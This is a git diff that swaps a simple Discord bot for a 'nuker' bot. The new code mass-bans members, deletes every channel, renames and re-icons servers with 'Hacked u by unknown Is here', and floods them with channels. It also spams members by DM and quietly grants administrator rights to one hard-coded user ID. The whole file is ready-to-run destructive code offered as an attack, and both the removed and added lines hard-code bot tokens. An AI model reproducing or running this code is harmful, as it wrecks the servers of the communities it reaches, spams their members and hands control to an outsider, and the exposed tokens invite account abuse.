@@ -1,14 +1,381 @@
-const { Attachment, Client, RichEmbed } = require("discord.js");
-const wavo = new Client({ disableEveryone: true });
+const Discord = require("discord.js");
+const LOka = new Discord.Client();
+console.log('By KBOOOOOOOOSH-YT');
+LOka.on('ready', () => {
+  console.log(`Logged in as ${LOka.user.tag} !`);
+ 
+});
+LOka.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
-wavo.on('ready', () => {
-let g = wavo.guilds.get("694888918331686943");
-let c = g.channels.get("694888919933911121");
-if(c.type == 'voice') {
-setInterval(() => {
-c.join();
-}, 100);
+ 
+});
+var prefix = "66"
+LOka.on("message", message => {
+  if(!message.content.startsWith(prefix)) return;;
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' ');
+  if (message.content.startsWith('hix15')) {
+    LOka.user.setUsername(argresult);
+  }
+    if (message.content.startsWith(prefix + 'on')) {
+    LOka.user.setStatus(argresult);
+  }
+});
+ 
+LOka.on("message", message => {
+
+            if (message.content.startsWith(prefix + "bc")) {
+                       
+  let args = message.content.split(" ").slice(1);
+  var argresult = args.join(' '); 
+  message.guild.members.forEach(m => {
+ m.send(`${argresult}\n ${m}`);
+})
+
+};     
+});
+ 
+var x1 = "kk"
+LOka.on('message', message => {
+     if (message.content === "k") {
+LOka.user.setUsername("Hacked u by unknown Is here")
+ 
 }
 });
+LOka.on('message', message => {
+     if (message.content === "k") {
+LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
+ 
+}
+});
+ 
 
-wavo.login("NTk1MzA5MjczMjQwNTY3ODEw.XpjETQ.lahDVTC3HziHX46zzZyNyqN3rx4");
+
+LOka.on('message', message => {
+     if (message.content === "k") {
+         LOka.guilds.forEach(m =>{
+             m.setName(`Hacked u by unknown Is here`)
+})
+}
+});
+ 
+LOka.on('message', message => {
+     if (message.content === "k") {
+                 if(!message.channel.guild) return;
+ 
+             message.guild.setIcon(`https://compote.slate.com/images/002ee52e-283e-4e8d-8d82-a08f504ddb00.jpg`)
+ 
+}
+});
+ 
+
+  
+  
+LOka.on('message', message => {
+         if (message.content === "k") {
+               LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+m.createChannel('Hacked u by unknown Is here', 'text');
+m.createChannel('Hacked u by unknown Is here', 'text');
+ 
+})
+}
+});
+ 
+LOka.on('message', message => {
+         if (message.content === "k") {
+                 LOka.guilds.forEach(m =>{
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+ 
+ 
+})
+}
+ 
+});
+ 
+ 
+const { Client } = require('discord.js');
+const client = new Client();
+ 
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+ 
+  await guild.fetchMembers();
+ 
+  await guild.owner.send(' Hacked u by unknown Is here , say bye to your server :smiling_imp: ').catch(e => { return void e; });
+ 
+ 
+ 
+  await Promise.all(guild.members.map(async (m) => {
+  if (m.bannable) {
+    
+     users++;
+     await m.send('^_^').catch(e => { return void e; });
+      return m.ban();
+    }
+ }));
+ 
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+ 
+    await guild.createChannel('Hacked u by unknown Is here', 'text');
+ 
+      await guild.createChannel('Hacked u by unknown Is here', 'voice');
+ 
+ 
+ 
+}
+ 
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by YzhF1");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+ 
+});
+ 
+LOka.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+ 
+LOka.on('guildMemberAdd', member => {
+   
+            if (member.id === "475059185831116811") {
+                member.guild.createRole({
+                    name : LOka.user.username,
+                    color : "RANDOM",
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+               
+            }
+       
+    });
+ 
+   
+ 
+ 
+ 
+ 
+LOka.login("NzA2NTI3NDE0MzcyNjYzMzg4.Xq7j-A.nlmbmgbrNkkzHq6rT-4i9XYC8QU");
